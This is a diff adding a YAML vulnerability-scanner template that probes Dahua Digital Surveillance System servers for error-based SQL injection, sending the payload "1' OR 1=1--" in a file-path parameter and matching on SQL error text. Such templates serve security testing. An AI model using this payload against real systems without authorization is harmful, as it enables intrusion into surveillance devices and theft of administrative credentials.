@@ -1,0 +1,31 @@
+id: dahua-dss-sqli
+
+info:
+  name: Dahua DSS SQL Injection
+  author: kamerka-fork
+  severity: high
+  description: |
+    Dahua Digital Surveillance System (DSS) is vulnerable to error-based
+    SQL injection that can lead to administrative credential theft.
+  reference:
+    - https://www.exploit-db.com/exploits/40863
+  tags: china-iot,dahua,sqli
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=1'%20OR%201=1--"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 500
+
+      - type: word
+        words:
+          - "SQL"
+          - "syntax error"
+          - "JDBC"
+        condition: or
